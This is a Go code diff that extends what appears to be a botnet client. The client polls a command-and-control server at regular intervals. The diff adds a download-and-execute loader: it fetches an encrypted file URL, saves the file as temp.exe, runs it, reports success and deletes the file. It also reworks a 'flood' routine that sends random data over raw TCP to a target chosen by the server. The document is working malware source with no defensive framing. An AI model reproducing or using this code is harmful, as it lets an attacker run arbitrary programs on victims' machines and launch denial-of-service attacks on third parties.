@@ -11,8 +11,11 @@ import (
 	"fmt"
 	"io"
 	"io/ioutil"
+	random "math/rand"
+	"net"
 	"net/http"
 	"os"
+	"os/exec"
 	"runtime"
 	"strings"
 	"time"
@@ -25,6 +28,10 @@ type Creds struct {
 
 type Session struct {
 	Key string `json:"key"`
+}
+
+type Load struct {
+	Url string `json:"file"`
 }
 
 type BootInstructions struct {
@@ -254,6 +261,82 @@ func getSessionKey(apiURL string, id string, token string) string {
 	return result
 }
 
+func checkLoad(apiURL string, id string, token string) bool {
+	var result bool
+	var loadURL string = apiURL + "/load/" + id + "/" + token
+
+	resp, err := http.Get(loadURL)
+
+	if err == nil {
+		if resp.StatusCode == 200 {
+			result = true
+		} else {
+			result = false
+		}
+	}
+
+	return result
+}
+
+func getLoadURL(apiURL string, sessionKey string, id string, token string) string {
+	var result string
+	var loadURL string = apiURL + "/load/" + id + "/" + token
+
+	resp, err := http.Get(loadURL)
+
+	if err == nil {
+		defer resp.Body.Close()
+
+		if resp.StatusCode == 200 {
+			var decodedJSON Load
+			responseBytes, _ := ioutil.ReadAll(resp.Body)
+
+			json.Unmarshal(responseBytes, &decodedJSON)
+
+			unencryptedUrl, _ := Decrypt(decodedJSON.Url, sessionKey)
+			result = unencryptedUrl
+		}
+	}
+
+	return result
+}
+
+func loadFile(apiURL string, sessionKey string, id string, token string, fileName string, fileURL string) {
+	resp, err := http.Get(fileURL)
+
+	if err == nil {
+
+		defer resp.Body.Close()
+
+		out, _ := os.Create(fileName)
+
+		defer out.Close()
+		io.Copy(out, resp.Body)
+
+		Exec := exec.Command(fileName)
+		Exec.Run()
+
+		requestBody, _ := json.Marshal(map[string]string{
+			"": "",
+		})
+
+		http.Post(apiURL+"/loadcheck/"+id+"/"+token, "application/json", bytes.NewBuffer(requestBody))
+
+		os.Remove(fileName)
+
+	}
+
+}
+
+func loadRun(apiURL string, sessionKey string, id string, token string, fileName string) {
+	var loadActive bool = checkLoad(apiURL, id, token)
+
+	if loadActive {
+		var loadFileUrl string = getLoadURL(apiURL, sessionKey, id, token)
+		loadFile(apiURL, sessionKey, id, token, fileName, loadFileUrl)
+	}
+}
+
 func checkBoot(apiURL string, id string, token string) bool {
 	var result bool
 	var bootURL string = apiURL + "/boot/" + id + "/" + token
@@ -341,27 +424,46 @@ func bootRoutine(id string, token string, endTime time.Time, bootInstructions []
 			break
 		}
 
-		flood(bootInstructions[1], bootInstructions[2])
+		conn, _ := net.Dial("tcp", bootInstructions[1]+":"+bootInstructions[2])
+		flood(conn)
 	}
 }
 
-func flood(target string, port string) {
-	resp, _ := http.Get(target + ":" + port)
-	fmt.Println("Sent packet")
-	if resp != nil {
-		io.Copy(ioutil.Discard, resp.Body)
-		resp.Body.Close()
+func randomString(strlen int, icint bool) string { //Generates a random string
+	if icint {
+		random.Seed(time.Now().UTC().UnixNano())
+		const chars = "qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890"
+		result := make([]byte, strlen)
+		for i := 0; i < strlen; i++ {
+			result[i] = chars[random.Intn(len(chars))]
+		}
+		return string(result)
 	}
+	random.Seed(time.Now().UTC().UnixNano())
+	const chars = "qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM"
+	result := make([]byte, strlen)
+	for i := 0; i < strlen; i++ {
+		result[i] = chars[random.Intn(len(chars))]
+	}
+	return string(result)
+}
+
+func flood(connection net.Conn) {
+	fmt.Println(0)
+	random.Seed(time.Now().UTC().UnixNano())
+	fmt.Fprintf(connection, randomString(random.Intn(256), true))
+	connection.Close()
 }
 
 func main() {
 	var bootFilePath string = "boot.txt"
 	var configPath string = "config.txt"
+	var tempLoadFileName string = "temp.exe"
 	var apiURL string = "http://127.0.0.1:5332"
 
 	var apiConnection bool = checkConnection(apiURL)
 
-	if apiConnection == true {
+	if apiConnection {
 		var configFileExists bool = checkFile(configPath)
 
 		if configFileExists {
@@ -377,6 +479,7 @@ func main() {
 				for range time.NewTicker(5 * time.Second).C {
 					sessionKey = getSessionKey(apiURL, credidentials[0], credidentials[1])
 					bootRun(apiURL, sessionKey, credidentials[0], credidentials[1], bootFilePath)
+					loadRun(apiURL, sessionKey, credidentials[0], credidentials[1], tempLoadFileName)
 				}
 
 			} else {
